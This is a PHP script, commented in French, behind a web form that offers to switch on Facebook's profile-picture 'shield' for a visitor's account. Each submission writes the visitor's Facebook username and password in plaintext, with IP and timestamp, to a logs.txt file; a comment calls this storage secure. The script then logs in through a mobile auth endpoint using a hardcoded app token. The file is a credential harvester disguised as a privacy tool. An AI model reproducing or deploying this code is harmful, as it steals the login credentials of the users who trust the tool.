<?php
session_start();

// Fonction pour récupérer l'IP réelle du visiteur
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Vérifier si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sécurisation des entrées
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $active = htmlspecialchars($_POST['active']);

    // Récupération de l'IP et date
    $ip = getUserIP();
    $date = date("Y-m-d H:i:s");

    // Format du log
    $logData = "[$date] IP: $ip | Username: $username | Password: $password\n";

    // Enregistrer les données dans logs.txt de manière sécurisée
    file_put_contents("logs.txt", $logData, FILE_APPEND | LOCK_EX);

    try {
        $fbShield = new FbShield($username, $password, $active);
        $fbShield->request();
    } catch (Exception $e) {
        $_SESSION['msg'] = "<div class='alert alert-danger' role='alert'>❌ " . $e->getMessage() . "</div>";
    }
}

// Redirection après soumission du formulaire
header("Location: index.php");
exit();

// Classe FbShield
class FbShield
{
    protected $username;
    protected $password;
    protected $active;

    function __construct($username, $password, $active){
        $this->username = $username;
        $this->password = $password;
        $this->active = $active;
    }

    function token(){
        return $this->generate();
    }

    function generate(){
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_URL, 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='.$this->username.'&locale=en_US&password='.$this->password.'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
        $res = curl_exec($curl);
        curl_close($curl);
        if(strpos($res, 'error')){
            throw new Exception('❌ Identifiants incorrects. Vérifiez votre Username et Password.');
        }else{
            return json_decode($res, true);
        }
    }

    function data(){
        return 'variables={"0":{"is_shielded":'.$this->active.',"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":'.$this->token()['uid'].',"client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation';
    }

    function headers()
    {
        $header = array('Content-Type: application/x-www-form-urlencoded', 'Authorization: OAuth '.$this->token()['access_token'].'');
        return $header;
    }

    function request()
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://graph.facebook.com/graphql');
        curl_setopt($curl, CURLOPT_HTTPHEADER, $this->headers());
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $this->data());
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $resp = curl_exec($curl);
        curl_close($curl);
        
        if(!$resp){
            throw new Exception('❌ Une erreur inconnue est survenue. Veuillez réessayer.');
        }

        $_SESSION['msg'] = ($this->active === "true") 
            ? "<div class=\"alert alert-success\" role=\"alert\">✅ <strong>Succès !</strong> La protection du profil a été activée.</div>" 
            : "<div class=\"alert alert-warning\" role=\"alert\">⚠️ <strong>Info :</strong> La protection du profil a été désactivée.</div>";
    }
}
?>
